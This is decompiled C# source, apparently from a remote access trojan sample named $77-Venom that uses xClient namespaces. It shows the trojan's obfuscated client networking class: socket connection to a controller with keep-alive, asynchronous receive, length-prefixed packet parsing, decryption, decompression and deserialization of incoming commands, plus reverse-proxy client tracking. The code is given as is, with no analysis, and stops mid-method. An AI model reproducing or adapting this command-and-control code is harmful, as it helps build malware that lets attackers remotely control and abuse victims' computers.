// Decompiled with JetBrains decompiler
// Type: 鸳˩ܨ蝦叕㞘⒱承�愾鋡ꠐ솞㡶Λ묠ᑜ㩨
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;
using xClient.Core.Utilities;

public class 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨
{
  private Socket 伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4;
  private List<ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳> 礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍;
  private readonly object \uEBFAв徝늏苟琂埊거\uEE0A\uE065뤽眡᱘\u338C蠇叧ⲫ넯‬퀝 = new object();
  private byte[] 뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ;
  private byte[] \u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕;
  private readonly Queue<byte[]> 딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶 = new Queue<byte[]>();
  private bool 㹕튐讹뛙\u16F9汰溰쒕椀ჶ\u175E뒼흰ὖ夣혴ꉥ妒\u089B乯;
  private readonly object 绚̛斺礫堷ᚉ㤢ᘦ쿠矱㚪㳫貌슿觱㚍䞵\uE6D4躂独 = new object();
  private readonly Queue<byte[]> 增昵濨㛥ᅑꄉ㥸ꍍ諷\uE7A2ฑ虭줲ᶡ䯡뗔奰妕ʹ\uF32B = new Queue<byte[]>();
  private bool 퐿\uE3C5ᵀﰥ㨧\uF7A2ঠኺ쮲엓홧膾瓺Ꝩ댒櫆ィ﨏䃦४;
  private readonly object Ù疝垖묧䟟䢋䮘ꉶᔤ\uFFFD\uEA66\uEA7D澌\uE10F佺ꙁ\u0BBB션휰寲 = new object();
  private byte[] \u25EE䡗적쨚涔䮁ᙙ킯悑ҰꞶ\u2846\u2F48蹅扩ᡟ큂倍峖绑;
  private bool 誢貙㡳\u2411碤저\u2796瘺ؤᗓ衞敜\uE274ꘔ宣笊ﲦ\uFFFD즅\uEC60;
  private int \uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅;
  private int 駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A;
  private int 頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ;
  private int ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪;
  private int Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB;
  private 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛 뛝ॲ뾫쒓ꯪ\uFFFD勇姴億臂ꡌ擿啲\uF1BF\uF41F\u22A0\u2F78隣\uE13D\u2936;
  private const bool 鏾烘歲᭭妕嶹ꆗᨫ䉳鲬㜫祇媾\uFFFDﴣ푅奭\uF8A5\u24B8\uFFFD = true;
  private const bool 訌\u2785䃒芍ቆ\uE5F0硤쳑푔谦庼ᠣ畭ჼ惇\uFFFD䱈ᑷꐪ\u21CC = true;

  public event 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.ㅱ蛍澹\uF24DⳆᜌ楛緛ᄖ绯\u208C\u2974絈\u25E4얛෭㐖\u2027哚\uE1D5 凇溂삃讓\uFDDE㦊棦鐊頙㽺홃瘁볰ᅮꀙ邈匛Ἲ̐댇;

  private void 簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(Exception ex)
  {
    // ISSUE: reference to a compiler-generated field
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.ㅱ蛍澹\uF24DⳆᜌ楛緛ᄖ绯\u208C\u2974絈\u25E4얛෭㐖\u2027哚\uE1D5 ଶ㚇ቭ姫ⶂ冸쁩韣퍼鰀펀趾ꎒ怙 = this.ଶ㚇\uE8A4ቭ姫\u17FCⶂ冸쁩韣퍼\u0AF5\u2AC3\uF7EE鰀펀\uFFFD趾ꎒ怙;
    if (ଶ㚇ቭ姫ⶂ冸쁩韣퍼鰀펀趾ꎒ怙 == null)
      return;
    ଶ㚇ቭ姫ⶂ冸쁩韣퍼鰀펀趾ꎒ怙(this, ex);
  }

  public event 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.\uE85Cꭜ\u2587漌鮔뜛ఖ\u296B棔偸浞鬢뵒\u24FE갨ᷘ맔\uE359㣈諸 棺\uED18\uEE92뇓湱퓙\u2FFC舎䨳\u21A5탑퇯\uED2F쏧蹥陛\uEB9A\u331D颇ꠕ;

  private void 獻攳툡\uE969㣻\uF125杠槩ᮤ鱠\u0D64\uF30Cኗ磜燫躯턒전歆ꭾ(bool connected)
  {
    if (this.Connected == connected)
      return;
    this.Connected = connected;
    // ISSUE: reference to a compiler-generated field
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.\uE85Cꭜ\u2587漌鮔뜛ఖ\u296B棔偸浞鬢뵒\u24FE갨ᷘ맔\uE359㣈諸 尫뻻蟧䛆塎扜磣ᒁ䁤碌盆謲Ǿ飝鰰ﬤ킒 = this.尫뻻蟧䛆塎扜磣ᒁ䁤\uEB00\uFFFD\u0E8F碌盆謲Ǿ飝鰰ﬤ킒;
    if (尫뻻蟧䛆塎扜磣ᒁ䁤碌盆謲Ǿ飝鰰ﬤ킒 == null)
      return;
    尫뻻蟧䛆塎扜磣ᒁ䁤碌盆謲Ǿ飝鰰ﬤ킒(this, connected);
  }

  public event 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.䓼섳\uFFFD弆嬨럛嫬蝸\uF0AA᪴苠쒁楘Ὥ닒弛끴澕竀젟 瀹鍅옩荲稝ֺꜩ됀폋헄ᓑ먥摀ﰙ旗\uFFFD\uF1D0炡萰\uF153;

  private void ꋾ\u1CA0檴ꋼ홼嶗踎嚁ඵ\u3201鴼\u2E83柵䋞ݎ瀯媽\uFFFD酠㙆(
    灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5 packet)
  {
    // ISSUE: reference to a compiler-generated field
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.䓼섳\uFFFD弆嬨럛嫬蝸\uF0AA᪴苠쒁楘Ὥ닒弛끴澕竀젟 滎퓶鴒雫ጂ鼨뒆냉륏뛣ㇸ鱞멅ｿ遄 = this.滎\uFF3C퓶鴒\u2A45雫ጂ鼨뒆냉륏뛣\uED66ㇸ鱞\uA87B멅\uF4D4ｿ遄;
    if (滎퓶鴒雫ጂ鼨뒆냉륏뛣ㇸ鱞멅ｿ遄 == null)
      return;
    滎퓶鴒雫ጂ鼨뒆냉륏뛣ㇸ鱞멅ｿ遄(this, packet);
  }

  public event 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.㤆搿砘㺀募拚\uFFFD蓘邑土駹㯴흸ఇ帜\uEB7D捩薡굲뿼 \uE4A2幫\uE74B䫒祉予挕恁\uE42B閬䍠ᾅ暎\u2122\u3370\uF2D9\uE8C6х躺캮;

  private void \uE0A9킋㷒凭\u2B37ẞ\u2B8C\u2698㺇㪕ｧ᮳侯箋읃㕊\uF8AB짚ﶿ瓘(
    灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5 packet,
    long length,
    byte[] rawData)
  {
    // ISSUE: reference to a compiler-generated field
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.㤆搿砘㺀募拚\uFFFD蓘邑土駹㯴흸ఇ帜\uEB7D捩薡굲뿼 藉ฒ덜れ槌䈻뗻ⵥؠ䪶嘰䀨ᜋ荼ⷚ猴ᑵ = this.\u2304藉ฒ덜\u2A29れ槌䈻뗻ⵥؠ䪶嘰䀨ᜋ荼ⷚ猴ᑵ\uF3AA;
    if (藉ฒ덜れ槌䈻뗻ⵥؠ䪶嘰䀨ᜋ荼ⷚ猴ᑵ == null)
      return;
    藉ฒ덜れ槌䈻뗻ⵥؠ䪶嘰䀨ᜋ荼ⷚ猴ᑵ(this, packet, length, rawData);
  }

  public int BUFFER_SIZE => 16384;

  public uint KEEP_ALIVE_TIME => 25000;

  public uint KEEP_ALIVE_INTERVAL => 25000;

  public int HEADER_SIZE => 4;

  public int MAX_PACKET_SIZE => 5242880;

  public ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳[] ProxyClients
  {
    get
    {
      lock (this.\uEBFAв徝늏苟琂埊거\uEE0A\uE065뤽眡᱘\u338C蠇叧ⲫ넯‬퀝)
        return this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍.ToArray();
    }
  }

  public bool Connected { get; private set; }

  protected Serializer Serializer { get; set; }

  protected 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨()
  {
    this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍 = new List<ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳>();
    this.뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ = new byte[this.BUFFER_SIZE];
    this.\u25EE䡗적쨚涔䮁ᙙ킯悑ҰꞶ\u2846\u2F48蹅扩ᡟ큂倍峖绑 = new byte[this.HEADER_SIZE];
  }

  protected void 㿿軿\uE552蹫\uF4EC\u24B3浍ᤌ澩鄍ĉ췯\uE07Dฒ뢱즢\uECA9쪘㫹\uEA4E(IPAddress ip, ushort port)
  {
    try
    {
      this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
      this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4 = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
      this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.SetKeepAliveEx(this.KEEP_ALIVE_INTERVAL, this.KEEP_ALIVE_TIME);
      this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.Connect(ip, (int) port);
      if (!this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.Connected)
        return;
      this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.BeginReceive(this.뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ, 0, this.뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ.Length, SocketFlags.None, new AsyncCallback(this.繆掺鉁\u2AAD蹬ℾ᳜ꉺ欺䴀隲\uEDF1ꗰ귔쮄\u007E\u22E6\u058B飱鲡), (object) null);
      this.獻攳툡\uE969㣻\uF125杠槩ᮤ鱠\u0D64\uF30Cኗ磜燫躯턒전歆ꭾ(true);
    }
    catch (Exception ex)
    {
      this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
    }
  }

  private void 繆掺鉁\u2AAD蹬ℾ᳜ꉺ欺䴀隲\uEDF1ꗰ귔쮄\u007E\u22E6\u058B飱鲡(IAsyncResult result)
  {
    int length;
    try
    {
      length = this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.EndReceive(result);
      if (length <= 0)
        throw new Exception("no bytes transferred");
    }
    catch (NullReferenceException ex)
    {
      return;
    }
    catch (ObjectDisposedException ex)
    {
      return;
    }
    catch (Exception ex)
    {
      this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
      return;
    }
    byte[] destinationArray = new byte[length];
    try
    {
      Array.Copy((Array) this.뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ, (Array) destinationArray, destinationArray.Length);
    }
    catch (Exception ex)
    {
      this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
      return;
    }
    lock (this.增昵濨㛥ᅑꄉ㥸ꍍ諷\uE7A2ฑ虭줲ᶡ䯡뗔奰妕ʹ\uF32B)
      this.增昵濨㛥ᅑꄉ㥸ꍍ諷\uE7A2ฑ虭줲ᶡ䯡뗔奰妕ʹ\uF32B.Enqueue(destinationArray);
    lock (this.Ù疝垖묧䟟䢋䮘ꉶᔤ\uFFFD\uEA66\uEA7D澌\uE10F佺ꙁ\u0BBB션휰寲)
    {
      if (!this.퐿\uE3C5ᵀﰥ㨧\uF7A2ঠኺ쮲엓홧膾瓺Ꝩ댒櫆ィ﨏䃦४)
      {
        this.퐿\uE3C5ᵀﰥ㨧\uF7A2ঠኺ쮲엓홧膾瓺Ꝩ댒櫆ィ﨏䃦४ = true;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.显杔\uFFFD촒\uFFFD寧鯝\uF4FC险纕嫊ﲅ️韁\uEE67๘䮅쟯ᳳଃ));
      }
    }
    try
    {
      this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.BeginReceive(this.뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ, 0, this.뀘\u23CF諀町\uE353樈꽇铙궰ۍ뎬\u3272鸨뜢鄝\uF130Ԗꃠ綻ݙ.Length, SocketFlags.None, new AsyncCallback(this.繆掺鉁\u2AAD蹬ℾ᳜ꉺ欺䴀隲\uEDF1ꗰ귔쮄\u007E\u22E6\u058B飱鲡), (object) null);
    }
    catch (ObjectDisposedException ex)
    {
    }
    catch (Exception ex)
    {
      this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
    }
  }

  private void 显杔\uFFFD촒\uFFFD寧鯝\uF4FC险纕嫊ﲅ️韁\uEE67๘䮅쟯ᳳଃ(object state)
  {
    while (true)
    {
      byte[] sourceArray;
      lock (this.增昵濨㛥ᅑꄉ㥸ꍍ諷\uE7A2ฑ虭줲ᶡ䯡뗔奰妕ʹ\uF32B)
      {
        if (this.增昵濨㛥ᅑꄉ㥸ꍍ諷\uE7A2ฑ虭줲ᶡ䯡뗔奰妕ʹ\uF32B.Count == 0)
        {
          lock (this.Ù疝垖묧䟟䢋䮘ꉶᔤ\uFFFD\uEA66\uEA7D澌\uE10F佺ꙁ\u0BBB션휰寲)
          {
            this.퐿\uE3C5ᵀﰥ㨧\uF7A2ঠኺ쮲엓홧膾瓺Ꝩ댒櫆ィ﨏䃦४ = false;
            break;
          }
        }
        else
          sourceArray = this.增昵濨㛥ᅑꄉ㥸ꍍ諷\uE7A2ฑ虭줲ᶡ䯡뗔奰妕ʹ\uF32B.Dequeue();
      }
      this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 += sourceArray.Length;
      bool flag1 = true;
      while (flag1)
      {
        switch (this.뛝ॲ뾫쒓ꯪ\uFFFD勇姴億臂ꡌ擿啲\uF1BF\uF41F\u22A0\u2F78隣\uE13D\u2936)
        {
          case 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛.윮ꡀ\uE8E5墪뀙㭜煆餼\uFFFD䑞꿜㢤\uF204쏰\u0F15欁篑ᓋ賹\uFFFD:
            if (this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 + this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ >= this.HEADER_SIZE)
            {
              int length = this.誢貙㡳\u2411碤저\u2796瘺ؤᗓ衞敜\uE274ꘔ宣笊ﲦ\uFFFD즅\uEC60 ? this.HEADER_SIZE - this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ : this.HEADER_SIZE;
              try
              {
                if (this.誢貙㡳\u2411碤저\u2796瘺ؤᗓ衞敜\uE274ꘔ宣笊ﲦ\uFFFD즅\uEC60)
                {
                  try
                  {
                    Array.Copy((Array) sourceArray, this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅, (Array) this.\u25EE䡗적쨚涔䮁ᙙ킯悑ҰꞶ\u2846\u2F48蹅扩ᡟ큂倍峖绑, this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ, length);
                  }
                  catch (Exception ex)
                  {
                    flag1 = false;
                    this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
                    continue;
                  }
                  this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB = BitConverter.ToInt32(this.\u25EE䡗적쨚涔䮁ᙙ킯悑ҰꞶ\u2846\u2F48蹅扩ᡟ큂倍峖绑, 0);
                  this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ = 0;
                  this.誢貙㡳\u2411碤저\u2796瘺ؤᗓ衞敜\uE274ꘔ宣笊ﲦ\uFFFD즅\uEC60 = false;
                }
                else
                  this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB = BitConverter.ToInt32(sourceArray, this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅);
                if (this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB > 0)
                {
                  if (this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB <= this.MAX_PACKET_SIZE)
                    goto label_24;
                }
                throw new Exception("invalid header");
              }
              catch (Exception ex)
              {
                flag1 = false;
                this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
                continue;
              }
label_24:
              this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 -= length;
              this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅 += length;
              this.뛝ॲ뾫쒓ꯪ\uFFFD勇姴億臂ꡌ擿啲\uF1BF\uF41F\u22A0\u2F78隣\uE13D\u2936 = 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛.勁\u284D\u0BD2ఫḮ혦峑䤀\uF6E1䗡㐓\uE9FD學똭ᓢ\uEA2B쌔헩俱臣;
              continue;
            }
            try
            {
              Array.Copy((Array) sourceArray, this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅, (Array) this.\u25EE䡗적쨚涔䮁ᙙ킯悑ҰꞶ\u2846\u2F48蹅扩ᡟ큂倍峖绑, this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ, this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪);
            }
            catch (Exception ex)
            {
              flag1 = false;
              this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
              continue;
            }
            this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ += this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪;
            this.誢貙㡳\u2411碤저\u2796瘺ؤᗓ衞敜\uE274ꘔ宣笊ﲦ\uFFFD즅\uEC60 = true;
            flag1 = false;
            continue;
          case 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛.勁\u284D\u0BD2ఫḮ혦峑䤀\uF6E1䗡㐓\uE9FD學똭ᓢ\uEA2B쌔헩俱臣:
            if (this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕 == null || this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕.Length != this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB)
              this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕 = new byte[this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB];
            int length1 = this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A + this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 >= this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB ? this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB - this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A : this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪;
            try
            {
              Array.Copy((Array) sourceArray, this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅, (Array) this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕, this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A, length1);
            }
            catch (Exception ex)
            {
              flag1 = false;
              this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
              continue;
            }
            this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A += length1;
            this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅 += length1;
            this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 -= length1;
            if (this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A == this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB)
            {
              bool flag2 = this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕.Length == 0;
              if (!flag2)
              {
                this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕 = ᥣ뺟覈놗뺿\uF27B셖杇喰\uFFFD䳮\u2565蒵ﷰᬛ斧㞮\u0F3C軟韗.乔쩆쏂ᆙ濣ⶈ\uE1B0老\uF053ঢ়㔱韰䈵ۜ老閯왼Ũ\uF532軟(this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕);
                flag2 = this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕.Length == 0;
              }
              if (!flag2)
              {
                try
                {
                  this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕 = ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.黌줶ウ拟\u33B2䣅鍠\u1977\uEB07盹\uFFFD誥坯\uFFFD\u237C쟄蠀浄䳑\uFFE6(this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕);
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
                  continue;
                }
                flag2 = this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕.Length == 0;
              }
              if (flag2)
              {
                flag1 = false;
                this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
                continue;
              }
              using (MemoryStream memoryStream = new MemoryStream(this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕))
              {
                try
                {
                  this.ꋾ\u1CA0檴ꋼ홼嶗踎嚁ඵ\u3201鴼\u2E83柵䋞ݎ瀯媽\uFFFD酠㙆((灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5) this.Serializer.Deserialize((Stream) memoryStream));
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
                  continue;
                }
              }
